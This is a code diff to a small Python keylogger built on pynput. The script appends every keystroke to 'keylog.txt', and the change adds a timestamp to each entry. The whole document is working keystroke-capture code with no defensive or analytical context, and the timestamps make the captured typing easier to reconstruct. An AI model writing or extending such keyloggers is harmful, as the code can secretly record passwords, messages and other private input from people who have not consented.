@@ -1,4 +1,5 @@
 from pynput.keyboard import Listener
+import datetime
 
 # File to store the keystrokes
 log_file = "keylog.txt"
@@ -8,7 +9,10 @@ def on_press(key):
     try:
         # Logging the pressed key to the file
         with open(log_file, "a") as f:
-            f.write(str(key).replace("'", ""))  # Remove extra quotes from the key representation
+            # Adding a timestamp to the keystroke
+            dt = datetime.datetime.now().strftime("%Y-%m-%d_%H:%M:%S")
+
+            f.write(dt + ": " + str(key).replace("'", "") + "\n")  # Remove extra quotes from the key representation
     except Exception as e:
         print(f"Error: {e}")
 
